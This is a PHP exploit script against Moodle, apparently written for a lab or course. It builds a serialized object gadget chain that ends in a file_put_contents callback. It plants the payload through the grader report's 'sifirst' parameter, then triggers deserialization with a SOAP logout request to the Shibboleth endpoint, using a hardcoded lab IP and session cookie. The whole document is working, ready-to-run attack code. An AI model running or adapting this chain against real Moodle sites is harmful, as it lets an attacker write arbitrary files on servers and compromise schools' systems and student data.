<?php
namespace core\lock {
    class lock {
        public function __construct($class)
{
            $this->key = $class;
        }
    }
}
namespace core_availability{
    class tree {
        public function __construct($class)
{
            $this->children = $class;
        }
    }
}
namespace core\dml{
    class recordset_walk {
        public function __construct($class)
{
            $this->recordset = $class;
            $this->callbackextra = "NgoVanThang_B18DCAT240";
            $this->callback = "file_put_contents";

        }
    }
}
namespace {
    class question_attempt_iterator{
        public function __construct($class)
{
            $this->slots = array(
                "xxx" => "key"
            );
            $this->quba = $class;
        }
    }
    class question_usage_by_activity{
        public function __construct()
{
            $this->questionattempts = array(
                "key" => "test.txt"
            );
        }
    }
    class core_question_external{}
    $add_lib = new core_question_external();
    $activity = new question_usage_by_activity();
    $iterator = new question_attempt_iterator($activity);
    $walk = new core\dml\recordset_walk($iterator);
    $tree = new core_availability\tree($walk);
    $lock = new core\lock\lock($tree);
    $arr = array($add_lib, $lock);
    $value=serialize($arr);
    echo $value;
    
    function httpPost($url, $data, $MoodleSession, $xml)
    {
        $curl = curl_init();
        $headers = array('Cookie: MoodleSession='.$MoodleSession);
        if($xml){
            array_push($headers, 'Content-Type: application/xml');
        }else{
            $data =  urldecode(http_build_query($data));
        }
        curl_setopt($curl,CURLOPT_URL,$url);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($curl, CURLOPT_HEADER, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_PROXY, '127.0.0.1:8080'); //proxy
        $response = curl_exec($curl);
        var_dump($response);
        curl_close($curl);
        return $response;
    }

    function pwn($url, $MoodleSession, $value){
        // echo "\n============ Payload ===========\n";
        // echo base64_encode("Testaaaaa|".$value."|tesstb");
        echo "\n [*] Inject Payload ";
        $data = array("id"=>1, "sifirst"=>'Testaaaaa|'.$value.'|Testbb');
        httpPost($url.'/grade/report/grader/index.php',$data, $MoodleSession, 0);
        echo "\n [*] Trigger Payload ";
        $data = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>
    <LogoutNotification><SessionID>ssss</SessionID>
    </LogoutNotification></s:Body></s:Envelope>';
        httpPost($url.'/auth/shibboleth/logout.php', $data, $MoodleSession, 1);
    }

// Exploit Main
    //$url = $argv[1];
    $url='http://192.168.56.107/moodle';
    $MoodleSession = '2rm677oc6pj4dosig1m2i4iaj7'; 
 pwn($url, $MoodleSession, $value);

}
?>
